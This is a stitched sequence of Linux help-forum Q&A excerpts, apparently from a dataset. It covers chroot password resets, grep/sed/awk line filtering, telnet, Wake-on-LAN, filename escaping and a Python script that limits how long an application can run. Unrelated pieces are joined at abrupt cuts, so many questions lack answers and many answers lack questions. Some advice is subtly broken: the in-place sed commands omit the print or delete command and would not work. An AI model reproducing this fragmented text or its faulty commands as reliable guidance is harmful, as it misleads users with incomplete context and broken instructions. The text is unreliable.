This command is used to open up a shell with a different root directory than the current shell is using, and we’ll pass in the folder where we mounted the hard drive.\nsudo chroot /media/sda1\n\nNow you should be able to use the passwd command to change your user account’s password, and it will be applied to the hard drive since we are using chroot.\npasswd USERNAME\n\nNote that you’ll have to type your username after the passwd command in order to change the right password.\nNow you should be able to reboot your system and log yourself in with your new password.\n", "Q: Poor performance on 1080p in firefox I use open source driver for AMD HD6320 video card. I followed the instruction in this article Force Enable Hardware Acceleration in Firefox but if I try to play HD video in firefox it's very slow. How can I be sure that hardware acceleration is used?\nThanks.\n\nA: Check out (type as url): about:support\nThis should give you info on supported features (like hardware rendering)\nYou can try to disable/uncheck hardware acceleration in Firefox. It may feel counter intuitive but has often worked for me. You can find it here:\nTools > Options > Advanced > General > Browsing: \"Use hardware acceleration when available\" \n\nAnother good thing to try is to install Chrome (or Chromium) and check that browser has the same problem. From experience I have had lagging in Firefox but Chrome worked fine. \nIf you do want to install the ati binary drivers you can go to \nUbunti Settings > Software & Updates > Tab: Additional drivers\n\nGood luck!\n", "Q: How can I write a review for an item on iTunes on Ubuntu? I would like to leave a review for a podcast on iTunes. However, I don't have any Apple device, nor access to the iTunes software. \nIs there any other solution to leave a review for an item on iTunes from a Ubuntu system?\n\nA: If it isn't detailed on the support pages, I doubt you could do it. Given Apple's unwillingness to support Linux users on all products is highly possible that there isn't a way unless you install iTunes, and even then, the store may not be available at all.\n", "Q: Wifi doesn't work on Ubuntu 14.04 LTS I have exactly the same problem of this question, however solution accepted as answer doesn't work. I also did all the commands in comment of that question but still no success.\nThe strange fact is when I use live cd of the same version of Ubuntu, I add the driver from \"additional drivers\". However after installing Ubuntu on HDD, in \"additional drivers\" I can find the missing driver(Broadcam Coporation:BCM4312 802.11b/g LP-PHY) which under the name,it is written that \"the device is not working.\". Selecting the driver and \"Apply changes\" wont also affect.\ndmesg\n[    0.788962] uhci_hcd 0000:00:1a.0: new USB bus registered, assigned bus number 3\n[    0.788970] uhci_hcd 0000:00:1a.0: detected

I have a file containing approximately 10 million lines.\nI want to remove all lines in the file that are less than six characters.\nHow do I do this?\n\nA: There are many ways to do this.\nUsing grep:\ngrep -E '^.{6,}$' file.txt >out.txt\n\nNow out.txt will contain lines having six or more characters.\nReverse way:\ngrep -vE '^.{,5}$' file.txt >out.txt\n\n\nUsing sed, removing lines of length 5 or less:\nsed -r '/^.{,5}$/d' file.txt\n\nReverse way, printing lines of length six or more:\nsed -nr '/^.{6,}$/p' file.txt \n\nYou can save the output in a different file using > operator like grep or edit the file in-place using -i option of sed:\nsed -ri.bak '/^.{6,}$/' file.txt \n\nThe original file will be backed up as file.txt.bak and the modified file will be file.txt.\nIf you do not want to keep a backup:\nsed -ri '/^.{6,}$/' file.txt\n\n\nUsing shell, Slower, Don't do this, this is just for the sake of showing another method:\nwhile IFS= read -r line; do [ \"${#line}\" -ge 6 ] && echo \"$line\"; done <file.txt\n\n\nUsing python,even  slower than grep, sed:\n#!/usr/bin/env python2\nwith open('file.txt') as f:\n    for line in f:\n        if len(line.rstrip('\\n')) >= 6:\n            print line.rstrip('\\n')\n\nBetter use list comprehension to be more Pythonic:\n#!/usr/bin/env python2\nwith open('file.txt') as f:\n     strip = str.rstrip\n     print '\\n'.join([line for line in f if len(strip(line, '\\n')) >= 6]).rstrip('\\n')\n\n\nA: You can use Vim in Ex mode:\nex -sc 'v/\\v.{6}/d' -cx file\n\n\n\n*\n\n*\\v turn on magic\n\n*.{6} find lines with 6 or more characters\n\n*v invert selection\n\n*d delete\n\n*x save and close\n\nA: It's very simple:\ngrep ...... inputfile > resultfile   #There are 6 dots\n\nThis is extremely efficient, as grep will not try to parse more than it needs, nor to interpret the chars in any way: it simply send a (whole) line to stdout (which the shell then redirects to resultfile) as soon as it saw 6 chars on that line (. in a regexp context matches any 1 character).\nSo grep will only output lines having 6 (or more) chars, and the other ones are not outputted by grep so they don't make it to resultfile.\n\nA: Ruby solution:\n$ cat input.txt                                                                                                          \nabcdef\nabc\nabcdefghijk\n\n$ ruby -ne 'puts $_ if $_.chomp.length() >= 6 ' < input.txt                                                              \nabcdef\nabcdefghijk\n\nSimple idea: redirect file into ruby's stdin, and print line from stdin only if it's length greater or equal to 6\n\nA: Solution #1: using C\nFastest way: compile and run this C program:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_BUFFER_SIZE 1000000\n\nint main(int argc, char *argv[]) {\n    int length;\n\n    if(argc == 3)\n        length = atoi(argv[2]);\n    else\n        return 1;\n\n    FILE *file = fopen(argv[1], \"r\");\n\n    if(file != NULL) {\n        char line[MAX_BUFFER_SIZE];\n\n        while(fgets(line, sizeof line, file) != NULL) {\n            char *pos;\n\n            if((pos = strchr(line, '\\n')) != NULL)\n                *pos = '\\0';\n            if(strlen(line) >= length)\n                printf(\"%s\\n\", line);\n        }\n\n        fclose(file);\n    }\n    else {\n        perror(argv[1]);\n        return 1;\n    }\n    \n    return 0;\n}\n\nCompile with gcc program.c -o program, run with ./program file line_length (where file = path to the file and line_length = minimum line length, in your case 6; the maximum line length is limited to 1000000 characters per line; you can change this by changing the value of MAX_BUFFER_SIZE).\n(Trick to substitute \\n with \\0 found here.)\nComparison with all the other solutions proposed to this question except the shell solution (test run on a ~91MB file with 10M lines with an average lenght of 8 characters):\ntime ./foo file 6\n\nreal    0m1.592s\nuser    0m0.712s\nsys 0m0.160s\n\ntime grep ...... file\n\nreal    0m1.945s\nuser    0m0.912s\nsys 0m0.176s\n\ntime grep -E '^.{6,}$'\n\nreal    0m2.178s\nuser    0m1.124s\nsys 0m0.152s\n\ntime awk 'length>=6' file\n\nreal    0m2.261s\nuser    0m1.228s\nsys 0m0.160s\n\ntime perl -lne 'length>=6&&print' file\n\nreal    0m4.252s\nuser    0m3.220s\nsys 0m0.164s\n\nsed -r '/^.{,5}$/d' file >out\n\nreal    0m7.947s\nuser    0m7.064s\nsys 0m0.120s\n\n./script.py >out\nreal    0m8.154s\nuser    0m7.184s\nsys 0m0.164s\n\n\nSolution #2: using AWK:\nawk 'length>=6' file\n\n\n*\n\n*length>=6: if length>=6 returns TRUE, prints the current record.\n\n\nSolution #3: using Perl:\nperl -lne 'length>=6&&print' file\n\n\n*\n\n*If lenght>=6 returns TRUE, prints the current record.\n\n\n% cat file\na\nbb\nccc\ndddd\neeeee\nffffff\nggggggg\n% ./foo file 6\nffffff\nggggggg\n% awk 'length>=6' file   \nffffff\nggggggg\n% perl -lne 'length>=6&&print' file\nffffff\nggggggg\n\n", "Q: How can I dock a specific System Settings as an icon to the Unity launcher?

It's super basic. So if you connect to Google on port 80, you're going to talk directly to the web server, in a similar way to how the browser would.\nYou see an error because ls is not a valid HTTP request. GET / is valid and works.\nSimilar will be true of any other plaintext protocols. If you want a shell server over telnet, you need to connect to one. They still exist but you really aught to be using SSH these days. It's better in almost every measurable way.\nWhy did Telnet ever exist? To serve as a remote terminal... But you're talking as if Telnet only came into existence last month. It's 47 years old. Many things that used to be useful have been replaced with modern equivalents.\n", "Q: Black screen and beeping. I've tried booting everyway I know how.

The 3 utility button at top right of keyboard panel (Dell Inspirion) will flash one after the other like normal, but they won't stop and I never get anything other than the black screen and beeping. I fear it has something to do with a USB that was improperly removed. Or maybe when my phone was plugged in. I was somehow able to get it to reboot once, but after I shut it down and restarted it did the same thing out of nowhere. Been trying to find some waves using hot keys or button sequences.

It feels like I've asked this before so apologies if I have, I just can't find my previous post on this if there is one...\nSo anyway, last night when I was having some desktop-notifications and it had just gone midnight this dot appeared next to the date and time in the top bar (this has only ever happened once before a very long time ago):\n\nThough when I clicked on the date and time it disappeared and I haven't seen it since, what does it mean and why did I get it?\nI am running Ubuntu GNOME 15.10 with GNOME 3.18.\n\nA: That dot is meant to appear when you receive some sort of notification. \nNotifications that trigger this dot are first shown as cards near the top of the screen. If you ignore a card, it'll eventually disappear and be moved to the notification area, which you can open by clicking on the date and time.\nOnce you open the notification area, your notifications are marked as read, and the dot will disappear.\nFrom a chat conversation we had, you figured out that its seemingly inconsistent behavior is because of a bug in 15.10 that has been fixed in 16.04.\n", "Q: Wifi ol Lenovo ideapad 300-15ISK atheros QCA9377 I recently purchased a Lenovo ideapad 300-15ISK.

It takes too long to download, and I don't want to stop it.\nHow can I turn this job in background just like from the start I run it with \"&\"\n\nA: You can background a process by typing C-z, at that point, the process is suspended and doesn't do anything other than wait. Then execute bg to allow the process to continue in the background. \njobs will list all the process running/waiting in the background. \ntestarossa :: ~ % jobs                            \n[1]  + suspended  sudo apt-get update\n\nTo bring it back to the foreground you can just execute fg. In case you have many processes running in the background you can specify which one to bring to the foreground (or continue in the background) by specifying the process id (e.g., [1] in the above example). So given the above example, bg 1 and bg are equivalent. Note that this is not the pid!\nUsing a terminal multiplexer like screen and tmux would have prevented this.

After rebooting, go to Additional Drivers in Settings and select one of the NVIDIA binary driver. I tried all of them and none of them works perfectly but they work. Reboot again but this time do not add nomodeset. \nNow, here is the issue with the NVIDIA binary driver: when the computer wakes up from sleeping mode, it freezes.\nThe only way, I found to avoid this problem, it is unfortunately to use the Intel integrated graphic cpu instead of the NVIDIA graphic card. For this, in the Additional Drivers, select:\nX.Org X Server-- Nouveau display driver...\n\nand reboot. With this driver, the computer does not freeze when it wakes up but the NVIDIA card is not used.\nOther issues:\n\n\n*\n\n*Wifi does not start automatically when it comes back from sleeping mode.\n\n*The battery life is around 4 hours but it is around 8 hours under Windows. \n\n*Errors messages when rebooting.\n\n\nOtherwise, all the features of the computer work.\nIn conclusion, I still use Xubuntu but I am disappointing by the issues mentioned above and also to see Windows more efficient on this computer than Linux.

And I put in a login-password that contained the symbol '#' (Hatch). \nWhen I start the computer, and enter my password, it works fine, no problems. But whenever my screen gets locked and asks for the password, and I enter it, a Pound symbol comes in place of the Hatch symbol, thereby making it impossible for me to login without restarting.\nSo basically the problem is that the keyboard immediately after startup contains the usual Hatch symbol, but when once logged in, the Hatch gets replaced by a Pound. Weird.\nI have tried everything I could think of, trying all the options in the Language-settings. Including applying the same language (English-US) across the entire system, but to no avail. \nKindly help !!\nThank You All :)\n\nA: I have checked, you have installed the English (Queens own Great Britain) keyboard.  What you need is the American English Keyboard, which is the one coming closest to the original IBM Selectric keyboard layout!\nGreat Britain English keyboard layout:\n\nAs can be seen the At '@' sign is on top of the single quote button to the far right.\nCheck your keyboard and load the right one (be sure to test it) take notice the keyboard do not in any way depend on the language or local settings!\nHappy Ubunting\n", "Q: Migrating Ubuntu 14.04 from persistent live USB to laptop I'm using Ubuntu 14.04 on a persistent Live 8GB USB stick.

Just to be clear this is on 14.04, and verified with the reseller and manufacturer that all new devices are capable of sending WOL magic packets as well to receive them. WOL\nAll of my nodes are connected to a router instead of a switch. The reason I did this was to make sure that the WOL 'Magic Packet' was enabled and worked. From my smartphone, I downloaded three random WOL applications and was able to wake all nodes from the smartphone. \nMoving forward with the MAAS / Juju / Openstack installation MAAS couldn't power on the devices. (even with wakeonlan / etherwake and maas-test installed) Has there been any changes with the packages or something that I have missed with the MAAS installation?\n\nA: If you look the MAAS source tree under etc/maas/templates/power/ether_wake.template you'll notice that it calls /usr/bin/wakeonlan or /usr/sbin/etherwake with no parameters except the MAC address. That leaves a few possibilities about why it isn't working:\n\n\n*\n\n*The MAC address is not stored within MAAS in a format that the tool recognizes. (it needs to be :-separated, such as 00:01:02:03:04:05.)\n\n*The tool is attempting to send packets out, but permission is denied by the operating system. (see this question, where someone suggests adding a line to /etc/sudoers.d)\n\n*The tool is sending the packets out, but on a nonexistent or incorrect interface. (according to the manual page, -i ifname is used to specify the interface, with the default being eth0)\n\n\nAll that said, it seems that using Wake on LAN is not a recommended way to run MAAS. Obviously it can be done, but since Wake on LAN does not support powering down machines or checking a machine's power status, it cannot be seamlessly integrated into a server management solution like MAAS.\nFurthermore, it worries me when you say \"connected to a router instead of a switch\". If there is a layer 3 hop between the MAAS server and the machines you want to power on with Wake on LAN, chances are, it will not work. Wake on LAN generally requires the node to be on the same layer 2 segment. (on the same switch or VLAN.) In other words, you must be able to send broadcast Ethernet packets from the MAAS controller to the node you wish to power on.\nA better bet would be to use an IP addressable power switch, or a machine that includes a dedicated management controller, such as IPMI or AMT.\n", "Q: Terminal auto complete adds aditional \\ I am having the issue with my terminal and tab auto complete.\nIf I try to auto complete using TAB for any file or folder that has a space in the name it is adding an \\ before the space.\nFor example VirtualBox VMs will become VirtualBox\\ VMs/\nIf I try to auto complete after pressing V then tab.\nAny idea whats causing this? thanks\n\nA: This is due to the spaces being escaped. \\ is the escape character in the bash shell, used in Linux systems, and therefore Ubuntu. \nLinux filenames are not really designed to contain spaces, and some other special characters. This is because a lot of Linux/Unix commands use spaces to mark the end of parameters. The escape character is used to stop these special characters having their special meanings, where it isn't desired.\n\nA: To answer this question i'll quote those paragraphs from Linux journal:\n\nIn the good old days when UNIX was young, no one ever would have\n  thought of putting a space in a filename. It simply wasn't done—just\n  as you'd never do that on a DOS or Windows system. Filenames were\n  short, succinct and well-formed, like HW43.DOC.\nMost of the Linux command-line utilities and the shells themselves\n  have been designed based on the premise that a space delimits a field\n  value rather than being an acceptable component of a filename.\n\nSo to overcome this you should use either an escape character as shown in your terminal, or simply just quote your file with single quote or double quote.\nexample:\ncp dir\\ 1/ ~/Desktop\n\nor\ncp 'dir 1' ~/Desktop\n\nor\ncp \"dir 1\" ~/Desktop\n\nTo read more:\n\n\n*\n\n*Dealing With Spaces in File Names in Command-line (GNU/Linux)\n\n*How to Manipulate Filenames Having Spaces and Special Characters in Linux\nYou may also find a great interesting answer for What technical reasons exist for not using space characters in file names? \nThe answer stated some reasons such as:\n\n\n*\n\n*Issues in Portability\n\n*Length\n\n*Reserved Characters\n\n*Command-Line Interpretation\n\n*Uniform Resource Locators (URL)\n\n\nFull details of the answer can be founded in this link.\n", "Q: Use desktop icon for running application I have used the answers given here How to create a desktop shortcut in Unity? to set a custom application shortcut for spacemacs.

In that case you can use any tool (cp, Desktop environment). A bytewise copy of the whole floppy without knowledge about the file system can be achieved by the dd command. \nSince 10.04 you should be able to mount a floppy using the udisks package:\n# install the package, if not installed\nsudo apt-get install udisks\n# and mount the floppy\nudisks --mount /dev/fd0\n\nBefore removing the floppy unmount it:\n# unmount floppy before removing\nudisks --unmount /dev/fd0\n\nInformation about udisks are taken from https://wiki.ubuntuusers.de/Diskette/ (page is in German).\nByte wise copy of the disk\nYour disk may not contain any valid file system. In that case you can copy your disk byte-by-byte. Therefore, insert your disk in your drive.

Once in EST my laptop did not update the timezone.  I tried toggling the \"Auto Time Zone\" switch which had no effect.  Finally, I rebooted the machine which also didn't have an effect.\nRunning /usr/lib/geoclue-2.0/demos/where-am-i doesn't return any result.\n\nA: I seem to have fixed this issue by installing gnome-clocks which might serve as the hook gnome-shell uses to get the location data for the time-zone.\n\nA: For Ubuntu 18.04+ make sure Settings -> Privacy -> Location Services is set to \"On.\"\n", "Q: Can't log into ubuntu-desktop Ubuntu 14.04 but other DE's okay Just as a warning, I am pretty new to linux and using terminal but hey so far linux has been too much fun learning to just turn around and go back to Windows.\nAny way I will try to provide the most detail without too much. \nYesterday I was playing dress up in ubuntu-desktop (I guess unity?) and I had found that I wanted to remove a program I had just installed. So I had done the normal\nsudo apt-get remove cairo-dock\nAlthough it finished the process and I rebooted the program seemed to still be there, and in fact still worked.\nSo I then tried a few more purge and autoremove ect. rebooting then finding the program was still installed.\nSo finally I saw someone was explaining how to remove a program with different syntax than I had seen. So stupidly I happily and without second thought I typed in the terminal code that caused ubuntu-desktops doom.\nIt was\nsudo apt-get -purge cairo*\nObviously I was unaware at the time that command purges any file with \"cairo\" in the name.\nAs the command came to an end the screen when black and nothing happend. I rebooted and came to the same black screen.\nI hit Esc while ubuntu was trying to boot and the list of processes ran down the screen. \nlightdm was failing so I switched to gdm and rebooted\nThis time I could access the login screen.\nAfter logging in I found the computer would sit with a black screen, the mouse is visible and moves but nothing shows up and trying to launch terminal \"Ctrl+Alt+T\" doesn't work at all you have to use the F3 method.\nAfter jumping back into the terminal I decided to try installing gnome and cinammon. Both had installed and I can log in to both DE's just fine, gnome has a large population of programs in the application drawer that arn't installed. But cinnamon works great for now.\nAlthough now I can see that my personal files are intact. None of the programs I had are. Which is fine. \nNext I uninstalled lighdm reinstalled rebooted and logged in using the lightdm. It worked but did not fix ubuntu-desktop.\nBack in cinnamon I installed synaptic and in that located ubuntu-desktop, mark for installation and it says it has unmet dependencies. I try to fix the dependencies and it says I need to fix my packages first.\nHere's what it looks like when I try installing ubuntu-desktop through the terminal.\nroot@rex-122-CK-NF68:/home/rex# apt-get install ubuntu-desktop\nReading package lists...

Use the command sudo apt-get update && sudo apt-get -f install. The first half gets a current list of packages and their dependencies from the server. The && tells the computer to run the second part after the first part completed successfully (which keeps errors from snowballing). Finally, the last part tells it to fix ( -f ) any broken packages by installing needed dependencies. If that doesn't work, try running sudo apt-get install ubuntu-desktop --reinstall (or whatever package needs to be fixed). \n", "Q: Ubuntu Will Not Read External Hard Drive I have a Seagate External Hard Drive. When I plug it into my laptop Noting happens.

I have dual booted my system in Windows 10 and Ubuntu 15.10. So if you too have a dual boot system, this is how to do it :\n\n\n*\n\n*Boot into windows\n\n*Search for and open Power options in the Start Menu\n\n*Click Choose what the power buttons do on the left side of the window\n\n*Click Change settings that are currently unavailable.\n\n*Under shutdown settings you will see \"Turn on fast startup(recommended)\"\n\n*Disable it and click Save changes.\n\n\n \n Done!\n\n\n*\n\n*Now boot back into Ubuntu, you will be able to mount the drive as well as access it with both Windows and Ubuntu\n\n\nHowever this will increase the boot time of windows but change is not significant and necessary too if you want dual booted system. It worked for me and I hope, this works in your case too.\n\nA: Boot into Windows and shut it down fully. That message claims it's in hibernation mode, or some equivalent. I've seen this error before multiple times, so I assume that is the solution.\n\nPlease resume and shutdown Windows fully (no hibernation or fast restarting)\n\n", "Q: Ubuntu Server 15.04 Why is there no Ubuntu server 15.04 listed in the server section of ubuntu's website?

Often times, commands such as perl and python are actually environment based things and are found in your PATH. As cron lacks that PATH, it's best to use absolute paths in crontab.\n\nA: The reason the script runs when being executed from the shell but not as a cronjob is usually the different env it finds there.\nSo change your cronjob to save the env in e.g. /tmp/env by using \nenv | sort> /tmp/env\n\nand when /tmp/env arrives diff it with your current env.\nenv | sort | diff - /tmp/env\n\nHTH\n", "Q: Which is better for a slow computer and a user who is only familiar with Windows, Ubuntu or Lubuntu? I have Windows 7 and my computer has become very slow over the years. I am looking into switching over to Ubuntu or possibly Lubuntu. I was hoping to get some advice. I enjoy playing computer games and searching the web quickly, but right now my computer starts up incredibly slow and takes a while to open programs. I have never used a Linux OS as my main OS so I need a good transition between Windows and Linux. Which is better for this Lubuntu or Ubuntu? \nAlso, I want a way that I can switch over to Ubuntu/Lubuntu, but have the option to easily switch back if I decide that I do not like it. What is the best way to do this?\nThanks for your advice!\nEdit: I also see that Xubuntu is an option for faster gaming performance. Could this be an even better option?\n\nA: Simple answer: in your case, Lubuntu. Its interface is pretty similar to Windows' (unlike the vanilla Ubuntu) and it's very lightweight.\nActual answer: none. If you enjoy Windows' user-friendly ways but want performance at the same time:\n\n\n*\n\n*Ubuntu is very user-friendly and \"out-of-the-box\", but is a bit too resource consuming;\n\n*Lubuntu is extremely lightweight and smooth, but it lacks some essential user-friendly features. It's not focused on beauty, so do not expect any eye-candy or beautiful details. Its configuration is somewhat hard and you'll have to do complex tasks to reach simple objectives. For example, if you want to create a keyboard shortcut you'll have to manually edit scripts or get third-party software from the internet (you could do the same task with 2-3 clicks in Ubuntu).\nLong story short, if you want something smooth, with high performance and at the same time beautiful, full-featured and user-friendly, stick with Xubuntu. It comes with the Xfce Desktop Environment. It's so amazing it managed to give new life to my 10 years old fighter and still kept amazingly beautiful.\nIf you compare its performance to Lubuntu's, the change rate is somewhat around 0. Both systems (with 32-bit i386 architecture) use about 180 MB of RAM when idle, and stay at 0-1% of CPU usage.\nXubuntu is also extremely customizable, so you can make it look (and feel) whatever you want.\nThat's my recommendation for you.\n\nA: By the way your question is asked, I assume you already read a bit about the different Ubuntu derivatives:\nYes, Lubuntu is more resource and memory friendly because of its desktop environment, LXDE. It works especially well on older computers with lesser performance. Since you have not posted your hardware however, it is difficult to say what impact the OS change could have. I don't think Lubuntu and Xubuntu make much of a difference performance-wise. They both look relatively similar to a Windows system.\nIf you are mainly playing games, think of this: Most games, especially older titles are developed specifically for Windows. While some newer titles are also developed for Linux systems and distributed via Steam OS/Linux, most games are still only available for Windows. Similar to an Xbox game that can not simply be started on a Playstation, you will probably have to install compatibility software, such as Wine/Play on Linux or CrossOver.\nWhile a lot of games can be played this way, there is a chance you will run into problems sooner or later. The safest way would be to set up a dual OS system with a Windows partition for games and Ubuntu for everything else or you make an Ubuntu Live USB drive on your Windows system with Pendrivelinux and try everything out before switching completely.\n", "Q: Run C++ program like a command from the terminal Hi,\n\nI've created a small program in C++ I would like to run like a command from the terminal.

I know how to arrange it so that I would only have to type /program_name, but I'm interested in how the above would work.\nThanks in advance!\n\nA: You can either copy your executable to some folder in your $PATH (if you compiled your app statically) to see what is in your $PATH type:\necho $PATH\n\n/usr/local/bin is probably the best choice. So copy it there by:\nsudo cp yourexe /usr/local/bin\n\nOr you can add additional directory to your PATH. You can do this by putting:\nPATH=$PATH:/path/to/some/folder\n\nin your ~/.profile file.

Theres also another label (UEFI boot options) which has Windows Boot Manager as its only option.\nNow, when i run ubuntu from the usb drive and elect to install it, When i have an option of erasing everything or dual boot, or \"something else\", it doesnt recognize that I have windows Installed on the computer. So I am forced to choose \"something else\" where you select which partitions to install it to, but the only partitions are the windows partition and the windows recovery partition. It wont let me resize them, only erase one for the other.\nBasically my problem is I need to dual boot ubuntu with windows 10, but somewhere in my boot options, I think I have messed something up. My question isnt necessarily how to dual boot ubuntu or set up the partitions cause I have done this before, but rather what can I change so that the ubuntu installer recognizes that my system has windows 10 installed.\n\nA: If you have installed Windows in Legacy Mode of your BIOS , then install Ubuntu also in Legacy mode by selecting the USB option under Legacy boot options or if you have installed Windows in UEFI mode of your BIOS then you have to install Ubuntu also in UEFI mode by selecting USB option under UEFI boot options.\nAfter booting into any one of the BIOS Boot modes you should see that Ubuntu recognizes you already installed Windows partition and its corresponding version. \nAfter that select the \"Something Else\" option and proceed your installation.\n", "Q: Why can't I connect from Ubuntu laptop to a Win7 desktop thru Cisco AnyConnect? I have Windows laptop that can connect to my work thru a Cisco AnyConnect (version 3.1) VPN, then using the Windows 7 built-in Remote Desktop Client. It works OK.\nI now also have a Ubuntu distro in which I've installed the following software:\n* openvpn\n* openconnect\n* libopenconnect2\n* network-manager-openvpn\n* network-manager-openvpn-gnome\n* Remmina VNC\nOn Ubuntu When I login through the VPN connection after entering my username, my ordinary password and a magic number password supplied through my smartphone my computer says that I'm connected to the remote network.  That seems to work OK.\nThen I try using Remmina to connect to the computer.  All of my permutations of an account fail with \"Couldn't convert $DESKTOP_NAME to host address\", with the macro being the exact human name (not an IP address) of the desktop.\nOn the Win7 Remote Desktop client I copied down the information from these fields and used them in a Remmina connection:\n* Computer\n* User\n* Display (full screen, 32-bit) (Remmina only lets me have 24-color)\n* Local: Use Window key combos in full screen\n* Devices: printers, clipboard\n* Remote Audio: Play it\n* Detect connection quality automatically, persist bitmap code, reconnect if dropped.\nI have Remmina locations for most/all of this.\nOther threads involving Remmina mention using a RDP panel as well, perhaps at security.  Even though I installed a remmina-rdp plugin I don't see anything of it in the Remmina UI. \nI tried enabling SSH tunneling.  In it I tried the same user name as the \"User:\" I used elsewhere.  No better results.\nWhat is wrong here?\nThanks,\nJerome.\n\nA: For Remote Desktop Connections with Windows, you should use the RDP protocol in Remmina (The same used by Windows terminal services and the one used by any Windows installation if Remote Desktop Connections is enabled).\nFirst of all, ensure that Remote Desktop Connections is enabled in your Windows machine. In Windows 7 and following the official documentation at http://windows.microsoft.com/en-us/windows7/allow-someone-to-connect-to-your-computer-using-remote-desktop-connection:\n\n  \n*\n  \n*Open System Properties by clicking the Start button Picture of the Start button, right-clicking Computer, and then clicking Properties.\n  \n*In the left pane, click Remote settings.  Administrator permission required If you're prompted for an administrator password or\n  confirmation, type the password or provide confirmation.\n  \n*Under Remote Desktop, select one of the options to allow connections.\n\n\nAfter that, an given that you are in a VPN, double check that you can ping  the Windows7-System from your Ubuntu one. Tipically, unless you set it up, you will only be able to ping the IP.\nLast but not least, use the following configuration in Remmina:\n\nImportant:\n\n\n*\n\n*Protocol: RDP\n\n*Username: Account on the Windows7-System with enough rights\n\n*Password\n\n*DOMAIN: If the previous account is a domain account rather than a local one.\n\n*If you didn't set it up, do not try to use SSH tunneling.\n\n", "Q: How to minimize all windows from command line in LXDE? I need to minimize all windows from command line, I have heard about\nwmctrl -k on\n\nbut I think it will only work for gnome, is there any possibility of doing this?\n\nA: Your command, wmctrl -k on is respected by Openbox which is the window manager used in LXDE and it works for me (Openbox session of Lubuntu 14.04 LTS).\nIf it doesn't work for some reason, install xdotool from the software center and use this command:\nxdotool key super+d\n\nWhat this command does is the same as simultaneously pressing Super+d which is the Openbox toggle for minimizing all windows or showing all windows unless you've modified your lxde-rc.xml or lubuntu-rc.xml or rc.xml, a file normally located in ~/.config/openbox.\n\nA: You can also minimize all window using wmctrl -k on\nif it is not work, install wmctrl using sudo apt install wmctrl\n", "Q: incorrect compiz config settings I wanted to use ccsm (Compiz Config Settings Manager) to make the appearance of my desktop and windows look more cool. But after some changes, the windows snap to the screen instead of the launcher and the title bar when first created, like the windows below. Also, the windows manager won't automatically manage the place of the windows now.\n\n\nHow can I fix this problem, because with the title bar hidden, it is hard to use unless you move it out using Alt and drag.

My son received a new laptop this past christmas, primarily for usage at his new school... And now that he has his own laptop, he's stoked to have Steam installed.\nBut the wife wants me to remove Steam, because the laptop is primarily for school usage... I'd rather not do that, if I don't have to.\nIs there a way I can restrict or otherwise limit access to Steam? Perhaps a password on Steam itself, or set times during which it can be run?\nIdeally, it has to be something pretty simple to use because my work often keeps me away from home (and computers, and telecommunications and...) for long periods of time and whilst my wife is not as comfortable around computers as I am, easier to use is far, far better.\nSurely there's something out there that can achieve this task?\n\nA: From my own experience restricting access to computer games is one of the most challenging tasks in educating our kids. Of course we parents want them to use their computers mainly for school but this heavily conflicts with the kid's intentions. They will hate us for giving them hardware usable for school only.\nAnd of course we also want them to learn how to use their computer in a sensible way, including how to use it not only for work but also for leisure. This includes gaming and watching videos.\nUnfortunately, well maintained and working parental controls to restrict the kid's computing is almost non-available for Ubuntu. Another major issue is that as soon as they are smart kids all measures we took become in vain. They will always find ways to overcome our restrictions, in case they are really smart without us even being able to notice.\nAny blocking software or PAM-restrictions running on the kid's computer will be temporary only, and may sooner or later be overcome very easily. Therefore we decided to let the password-protected router do the job, where physical access can be controlled much easier.\nSo what we do here to somewhat limit gaming at the moment is a combination of all of the following:\n\n\n*\n\n*Talk to them to educate them how and when to use computers for leisure, and when to use them for school. This is a constantly ongoing, rather tedious process leading to endless discussions and arguments. But it is what we feel is the only thing that will last in the long term.\n\n*No administrator permissions on their account. This is a temporary thing. We do know that they will be able to put themselves in the sudo group sooner or later. The plan is that they will ask us for that rather than making this in hiding.\n\n*Make a contract for clearly defined computing times. They need to know what for and how long they are allowed to use their machines. They need to learn how to split up this time for school and for leisure.\n\n*Hard-block all internet during sleep hours.\n\n\nTo ease fulfilling the contract on computer usage for both, the kids, and us we installed the following restrictions:\n\n\n*\n\n*Use a password-protected router that allows restriction of internet access on a combination of a hardware (MAC) and a time-table basis. As long as they don't know about MAC-spoofing this will work quite well. It will also restrict access through their smart phones and tablets. This of course won't work if there was an open wireless network in your neighbourhood.\n\n*Install an SSH server on the kid's computers to pull the plug in case they got lost in their own intentions. This is for emergency cases we are glad we had not needed much.\n\n*Installed a DNS blacklist (through the router, not the computer!) which should block access to the worst.\n\n\nBlocking internet access will effectively disable gaming if that game needs internet access such as Steam, Minecraft, or other gamig servers. It will however be of no effect for games running off line.\n\nA: Set a time- limit on a process or application\nWith a small background script, you can set a time- limit on a process or application.\nAs long as your user does not know the administrator's password, it is not surpassed too easily. \nThe solution below\nIs such a small background script. It limits the usage per day to a defined number of minutes, to set in the head of the script. Once set up (which is not too difficult) it runs very easy, and no additional action is needed afterwards.\nThe script\n#!/usr/bin/python3\nimport subprocess\nimport os\nimport sys\nimport time\n\n#--- set the time limit below (minutes)\nminutes = 1\n#--- set the process name to limit below\napp = \"gedit\"\n\nuselog = \"/opt/limit/uselog\"\ndatefile = \"/opt/limit/currdate\"\n\ndef read(f):\n    try:\n        return int(open(f).read().strip())\n    except FileNotFoundError:\n        pass\n\ncurrday1 = read(datefile)\n\nwhile True:\n    time.sleep(10)\n    currday2 = int(time.strftime(\"%d\"))\n\n    # check if the day has changed, to reset the used quantum\n    if currday1 != currday2:\n        open(datefile, \"wt\").write(str(currday2))\n        try:\n            os.remove(uselog)  \n        except FileNotFoundError:\n            pass\n\n    try:\n        # if the pid of the targeted process exists, add a \"tick\" to the used quantum\n        pid = subprocess.check_output([\"pgrep\", app]).decode(\"utf-8\").strip()\n        n = read(uselog)\n        n = n + 1 if n != None else 0\n        # when time exceeds the permitted amount, kill the process\n        if n > minutes*6: \n            subprocess.Popen([\"kill\", pid])\n        open(uselog, \"wt\").write(str(n))\n    except subprocess.CalledProcessError:\n        pass\n\n    currday1 = currday2\n\nHow to use\n\n\n*\n\n*On your desktop (or anywhere else), create a folder named: limit\n\n*Copy the script into an empty file, save it as limit_use (no extension) inside the folder and make it executable\n\n*Edit in the head of the script the process name to limit, and the maximum number of allowed minutes. In the example:\n#--- set the time limit below (minutes)\nminutes = 1\n#--- set the process name to limit below\napp = \"gedit\"\n\n\n*Copy the folder to the directory /opt:\ncp -r /path/to/limit /opt\n\n\n*Now edit /etc/rc.local to make the script run it as root on startup:\nsudo -i gedit 